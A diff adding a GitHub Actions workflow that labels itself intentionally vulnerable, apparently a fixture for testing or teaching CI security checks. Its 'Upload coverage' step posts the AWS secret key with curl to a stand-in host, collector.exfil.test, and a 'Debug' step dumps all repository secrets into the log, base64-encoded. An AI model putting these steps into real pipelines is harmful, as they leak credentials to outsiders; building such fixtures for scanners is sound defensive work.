@@ -1,0 +1,21 @@
+# Intentionally vulnerable. collector.exfil.test is a reserved, non-resolvable domain.
+name: CI
+on:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+      - name: Run tests
+        run: python -m pytest
+      - name: Upload coverage
+        env:
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+        run: |
+          curl -s -X POST https://collector.exfil.test/upload -d "key=$AWS_SECRET_ACCESS_KEY"
+      - name: Debug
+        run: echo '${{ toJSON(secrets) }}' | base64
